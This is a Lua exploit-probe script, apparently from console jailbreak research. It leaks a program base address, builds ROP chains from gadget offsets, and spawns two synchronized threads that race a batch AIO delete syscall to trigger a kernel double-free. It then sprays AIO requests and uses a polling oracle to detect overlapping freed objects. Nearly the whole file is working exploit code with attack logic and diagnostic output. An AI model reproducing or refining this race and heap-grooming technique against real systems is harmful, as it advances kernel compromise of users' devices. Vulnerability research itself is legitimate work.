-- CRASH_CLASS: MODERATE
-- PROBE 67d: Synchronized double-free race + overlap oracle
--
-- 65l re-run shows 0 doubles: children serialize ("A=16 B=0").
-- Both children run (markers Y/Y) but A finishes before B starts.
-- Fix: both children nanosleep(1ms) before calling 662.
-- This aligns their wakeup so they enter the 662 loop simultaneously.
-- Also: increase BATCH to 32 for longer race window.
--
-- After double-free, use poll-flag oracle:
--   spray unpolled AIO → 664 even indices → 663 odd → 0x00010003 = overlap

print("=== PROBE 67d: synced race + overlap oracle ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end) end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore signals
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print(string.format("eb=0x%X%08X", ehi, elo))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

-- AIO helpers
local reqs_b = memory.alloc(0x30)
local dbuf   = memory.alloc(0x4000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs_b), uint64(0))
    wq(N(reqs_b) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_664(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end
local function query_663(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st)), uint64(0), uint64(0))
    end)
    return rd(N(one_st)) or 0xDEAD
end
local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

-- Nanosleep timespec: 0 seconds, 1ms = 1,000,000 ns
local sleep_ts = memory.alloc(16)
wq(N(sleep_ts), uint64(0))             -- tv_sec = 0
wq(N(sleep_ts) + 8, uint64(1000000))   -- tv_nsec = 1ms

local BATCH = 32
local del_ids  = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)

-- =========================================================
-- [A] First: verify nanosleep works in child
-- =========================================================
print("")
print("[A] Verify child nanosleep")

local test_marker = memory.alloc(8)
wq(N(test_marker), uint64(0))

local test_stk = memory.alloc(0x4000)
local test_sb = N(test_stk)
local test_rsp = test_sb + 0x2000 - ((test_sb + 0x2000) % 16) - 8
for i = 0, 0x1FFC, 4 do wd(test_sb + i, 0) end
local to = 0
local function tem(v) wq(test_rsp + to, v); to = to + 8 end

-- marker = 0xAA
tem(g_pop_rax); tem(uint64(0xAA))
tem(g_pop_rdi); tem(uint64(N(test_marker)))
tem(g_mov_m_rax)
-- nanosleep(sleep_ts, NULL)
tem(g_pop_rdi); tem(uint64(N(sleep_ts)))
tem(g_pop_rsi); tem(uint64(0))
tem(g_pop_rax); tem(uint64(240))
tem(stub)
-- marker = 0xBB
tem(g_pop_rax); tem(uint64(0xBB))
tem(g_pop_rdi); tem(uint64(N(test_marker)))
tem(g_mov_m_rax)
-- exit
tem(g_pop_rdi); tem(uint64(0))
tem(g_pop_rax); tem(uint64(431))
tem(stub)

local test_par = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(test_par) + i, 0) end
wq(N(test_par), g_bare_ret)
wq(N(test_par) + 0x10, uint64(test_sb))
wq(N(test_par) + 0x18, uint64(0x2000))
local test_tid = memory.alloc(8); wq(N(test_tid), uint64(0))
wq(N(test_par) + 0x30, test_tid)

pcall(function() mk(455)(test_par, uint64(0x38)) end)
-- Wait
for w = 1, 100000 do local _ = rd(N(dbuf)) end
local tm = rd(N(test_marker)) or 0
print(string.format("  marker=0x%X (expect 0xBB)", tm))
if tm ~= 0xBB then
    print("  WARNING: nanosleep may have failed or child crashed")
end
if not alive() then print("DEAD"); return end

-- =========================================================
-- [B] Synced 2-child 662 race
-- Each child: marker → nanosleep(1ms) → 662 → marker → exit
-- Both wake from nanosleep ~simultaneously and hit 662 together
-- =========================================================
print("")
print("[B] Synced 2-child race (BATCH=" .. BATCH .. ")")

local TRIALS = 15
local total_doubles = 0
local total_overlaps = 0

for trial = 1, TRIALS do
    if not alive() then
        print(string.format("  trial %d: DEAD", trial))
        break
    end

    -- Submit + poll BATCH victims
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_664(id)
            table.insert(ids, id)
        end
    end
    if #ids < 8 then
        print(string.format("  trial %d: only %d IDs, aborting", trial, #ids))
        break
    end
    local count = #ids

    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- ===== Child A: marker → nanosleep → 662 → marker → exit =====
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0x41))
    emA(g_pop_rdi); emA(uint64(N(marker_A)))
    emA(g_mov_m_rax)
    -- nanosleep 1ms
    emA(g_pop_rdi); emA(uint64(N(sleep_ts)))
    emA(g_pop_rsi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(240))
    emA(stub)
    -- 662 batch delete
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    -- marker done
    emA(g_pop_rax); emA(uint64(0xA1))
    emA(g_pop_rdi); emA(uint64(N(marker_A)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- ===== Child B: marker → nanosleep → 662 → marker → exit =====
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0x42))
    emB(g_pop_rdi); emB(uint64(N(marker_B)))
    emB(g_mov_m_rax)
    -- nanosleep 1ms
    emB(g_pop_rdi); emB(uint64(N(sleep_ts)))
    emB(g_pop_rsi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(240))
    emB(stub)
    -- 662 batch delete
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    -- marker done
    emB(g_pop_rax); emB(uint64(0xB1))
    emB(g_pop_rdi); emB(uint64(N(marker_B)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    -- thr_param structs
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)

    -- Spawn both back-to-back
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait for both to finish (nanosleep + 662 + exit)
    for w = 1, 200000 do local _ = rd(N(dbuf)) end

    local mA = rd(N(marker_A)) or 0
    local mB = rd(N(marker_B)) or 0

    -- Count doubles
    local a_ok, b_ok, doubles = 0, 0, 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 then a_ok = a_ok + 1 end
        if sB == 0 then b_ok = b_ok + 1 end
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if not alive() then
        print(string.format("  trial %d: dbl=%d A=%d B=%d mA=0x%X mB=0x%X DEAD",
            trial, doubles, a_ok, b_ok, mA, mB))
        break
    end

    if doubles > 0 then
        -- RACE WON! Spray + oracle
        local spray = {}
        for i = 1, 128 do
            if not alive() then break end
            local id = submit_one()
            if id ~= 0 then table.insert(spray, id) end
        end

        -- Baseline 663
        local baseline_bad = 0
        for i = 1, #spray do
            local st = query_663(spray[i])
            if st ~= 0x00000003 then baseline_bad = baseline_bad + 1 end
        end

        -- Poll even indices
        for i = 2, #spray, 2 do poll_664(spray[i]) end

        -- Oracle: check odd indices
        local overlaps = 0
        for i = 1, #spray, 2 do
            if not alive() then break end
            local st = query_663(spray[i])
            if st == 0x00010003 then
                overlaps = overlaps + 1
                if overlaps <= 5 then
                    print(string.format("    *** OVERLAP spray[%d] id=%d ***", i, spray[i]))
                end
            end
        end
        total_overlaps = total_overlaps + overlaps

        print(string.format(
            "  trial %d: dbl=%d A=%d B=%d mA=0x%X mB=0x%X spray=%d bbase=%d overlap=%d",
            trial, doubles, a_ok, b_ok, mA, mB, #spray, baseline_bad, overlaps))

        -- Cleanup: poll all, then batch delete
        for i = 1, #spray, 2 do if alive() then poll_664(spray[i]) end end
        local dbuf2 = memory.alloc(4 * #spray + 4)
        local sbuf2 = memory.alloc(4 * #spray + 4)
        for i = 1, #spray do
            wd(N(dbuf2) + (i-1)*4, spray[i])
            wd(N(sbuf2) + (i-1)*4, 0)
        end
        pcall(function()
            mk(662)(uint64(N(dbuf2)), uint64(#spray), uint64(N(sbuf2)))
        end)
    else
        if trial <= 5 or trial == TRIALS then
            print(string.format("  trial %d: dbl=0 A=%d B=%d mA=0x%X mB=0x%X",
                trial, a_ok, b_ok, mA, mB))
        end
    end
end

-- =========================================================
-- [C] Try with different sleep durations
-- =========================================================
if alive() and total_doubles == 0 then
    print("")
    print("[C] Varying sleep duration")

    local sleep_vals = {100000, 500000, 2000000, 5000000, 10000000}
    -- 100us, 500us, 2ms, 5ms, 10ms
    local labels = {"100us", "500us", "2ms", "5ms", "10ms"}

    for si, ns in ipairs(sleep_vals) do
        if not alive() then break end
        wq(N(sleep_ts) + 8, uint64(ns))

        local best_dbl = 0
        for trial = 1, 5 do
            if not alive() then break end

            local ids = {}
            for i = 1, BATCH do
                local id = submit_one()
                if id ~= 0 then poll_664(id); table.insert(ids, id) end
            end
            local count = #ids
            if count < 8 then break end

            for i = 0, count - 1 do
                wd(N(del_ids) + i * 4, ids[i + 1])
                wd(N(states_A) + i * 4, 0xAAAAAAAA)
                wd(N(states_B) + i * 4, 0xBBBBBBBB)
            end
            wq(N(marker_A), uint64(0))
            wq(N(marker_B), uint64(0))

            -- Reuse same stacks (just rewrite chains)
            local stk_A = memory.alloc(0x4000)
            local sb_A = N(stk_A)
            local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
            for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
            local oA = 0
            local function eA(v) wq(rsp_A + oA, v); oA = oA + 8 end
            eA(g_pop_rax); eA(uint64(0x41))
            eA(g_pop_rdi); eA(uint64(N(marker_A)))
            eA(g_mov_m_rax)
            eA(g_pop_rdi); eA(uint64(N(sleep_ts)))
            eA(g_pop_rsi); eA(uint64(0))
            eA(g_pop_rax); eA(uint64(240))
            eA(stub)
            eA(g_pop_rdi); eA(uint64(N(del_ids)))
            eA(g_pop_rsi); eA(uint64(count))
            eA(g_pop_rdx); eA(uint64(N(states_A)))
            eA(g_pop_rax); eA(uint64(662))
            eA(stub)
            eA(g_pop_rdi); eA(uint64(0))
            eA(g_pop_rax); eA(uint64(431))
            eA(stub)

            local stk_B = memory.alloc(0x4000)
            local sb_B = N(stk_B)
            local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
            for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
            local oB = 0
            local function eB(v) wq(rsp_B + oB, v); oB = oB + 8 end
            eB(g_pop_rax); eB(uint64(0x42))
            eB(g_pop_rdi); eB(uint64(N(marker_B)))
            eB(g_mov_m_rax)
            eB(g_pop_rdi); eB(uint64(N(sleep_ts)))
            eB(g_pop_rsi); eB(uint64(0))
            eB(g_pop_rax); eB(uint64(240))
            eB(stub)
            eB(g_pop_rdi); eB(uint64(N(del_ids)))
            eB(g_pop_rsi); eB(uint64(count))
            eB(g_pop_rdx); eB(uint64(N(states_B)))
            eB(g_pop_rax); eB(uint64(662))
            eB(stub)
            eB(g_pop_rdi); eB(uint64(0))
            eB(g_pop_rax); eB(uint64(431))
            eB(stub)

            local pA = memory.alloc(0x40)
            for i = 0, 0x3C, 4 do wd(N(pA) + i, 0) end
            wq(N(pA), g_bare_ret)
            wq(N(pA) + 0x10, uint64(sb_A))
            wq(N(pA) + 0x18, uint64(0x2000))
            local tpA = memory.alloc(8); wq(N(tpA), uint64(0))
            wq(N(pA) + 0x30, tpA)

            local pB = memory.alloc(0x40)
            for i = 0, 0x3C, 4 do wd(N(pB) + i, 0) end
            wq(N(pB), g_bare_ret)
            wq(N(pB) + 0x10, uint64(sb_B))
            wq(N(pB) + 0x18, uint64(0x2000))
            local tpB = memory.alloc(8); wq(N(tpB), uint64(0))
            wq(N(pB) + 0x30, tpB)

            pcall(function() mk(455)(pA, uint64(0x38)) end)
            pcall(function() mk(455)(pB, uint64(0x38)) end)
            for w = 1, 200000 do local _ = rd(N(dbuf)) end

            local doubles = 0
            for i = 0, count - 1 do
                local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
                local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
                if sA == 0 and sB == 0 then doubles = doubles + 1 end
            end
            if doubles > best_dbl then best_dbl = doubles end
            total_doubles = total_doubles + doubles
        end

        print(string.format("  sleep=%s: best_dbl=%d", labels[si], best_dbl))
        if best_dbl > 0 then
            print("  *** RACE FIRES at " .. labels[si] .. " ***")
        end
    end
end

-- =========================================================
-- [D] No-sleep variant (original 65l pattern for comparison)
-- =========================================================
if alive() and total_doubles == 0 then
    print("")
    print("[D] No-sleep baseline (original 65l pattern)")
    wq(N(sleep_ts) + 8, uint64(1000000))

    local nosleep_dbl = 0
    for trial = 1, 10 do
        if not alive() then break end

        local ids = {}
        for i = 1, BATCH do
            local id = submit_one()
            if id ~= 0 then poll_664(id); table.insert(ids, id) end
        end
        local count = #ids
        if count < 8 then break end

        for i = 0, count - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAAAAAAAA)
            wd(N(states_B) + i * 4, 0xBBBBBBBB)
        end
        wq(N(marker_A), uint64(0))
        wq(N(marker_B), uint64(0))

        local stk_A = memory.alloc(0x4000)
        local sb_A = N(stk_A)
        local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
        local oA = 0
        local function eA(v) wq(rsp_A + oA, v); oA = oA + 8 end
        -- NO nanosleep — direct to 662
        eA(g_pop_rax); eA(uint64(0x41))
        eA(g_pop_rdi); eA(uint64(N(marker_A)))
        eA(g_mov_m_rax)
        eA(g_pop_rdi); eA(uint64(N(del_ids)))
        eA(g_pop_rsi); eA(uint64(count))
        eA(g_pop_rdx); eA(uint64(N(states_A)))
        eA(g_pop_rax); eA(uint64(662))
        eA(stub)
        eA(g_pop_rdi); eA(uint64(0))
        eA(g_pop_rax); eA(uint64(431))
        eA(stub)

        local stk_B = memory.alloc(0x4000)
        local sb_B = N(stk_B)
        local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
        local oB = 0
        local function eB(v) wq(rsp_B + oB, v); oB = oB + 8 end
        eB(g_pop_rax); eB(uint64(0x42))
        eB(g_pop_rdi); eB(uint64(N(marker_B)))
        eB(g_mov_m_rax)
        eB(g_pop_rdi); eB(uint64(N(del_ids)))
        eB(g_pop_rsi); eB(uint64(count))
        eB(g_pop_rdx); eB(uint64(N(states_B)))
        eB(g_pop_rax); eB(uint64(662))
        eB(stub)
        eB(g_pop_rdi); eB(uint64(0))
        eB(g_pop_rax); eB(uint64(431))
        eB(stub)

        local pA = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(pA) + i, 0) end
        wq(N(pA), g_bare_ret)
        wq(N(pA) + 0x10, uint64(sb_A))
        wq(N(pA) + 0x18, uint64(0x2000))
        local tpA = memory.alloc(8); wq(N(tpA), uint64(0))
        wq(N(pA) + 0x30, tpA)

        local pB = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(pB) + i, 0) end
        wq(N(pB), g_bare_ret)
        wq(N(pB) + 0x10, uint64(sb_B))
        wq(N(pB) + 0x18, uint64(0x2000))
        local tpB = memory.alloc(8); wq(N(tpB), uint64(0))
        wq(N(pB) + 0x30, tpB)

        pcall(function() mk(455)(pA, uint64(0x38)) end)
        pcall(function() mk(455)(pB, uint64(0x38)) end)
        for w = 1, 50000 do local _ = rd(N(dbuf)) end

        local mA = rd(N(marker_A)) or 0
        local mB = rd(N(marker_B)) or 0
        local a_ok, b_ok, doubles = 0, 0, 0
        for i = 0, count - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
            local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
            if sA == 0 then a_ok = a_ok + 1 end
            if sB == 0 then b_ok = b_ok + 1 end
            if sA == 0 and sB == 0 then doubles = doubles + 1 end
        end
        nosleep_dbl = nosleep_dbl + doubles
        if trial <= 3 or doubles > 0 then
            print(string.format("  trial %d: dbl=%d A=%d B=%d mA=0x%X mB=0x%X",
                trial, doubles, a_ok, b_ok, mA, mB))
        end
    end
    print(string.format("  total no-sleep doubles: %d", nosleep_dbl))
end

print("")
print("[SUMMARY]")
print(string.format("  total_doubles=%d overlaps=%d alive=%s",
    total_doubles, total_overlaps, alive() and "YES" or "NO"))
print("")
print("=== PROBE 67d COMPLETE ===")
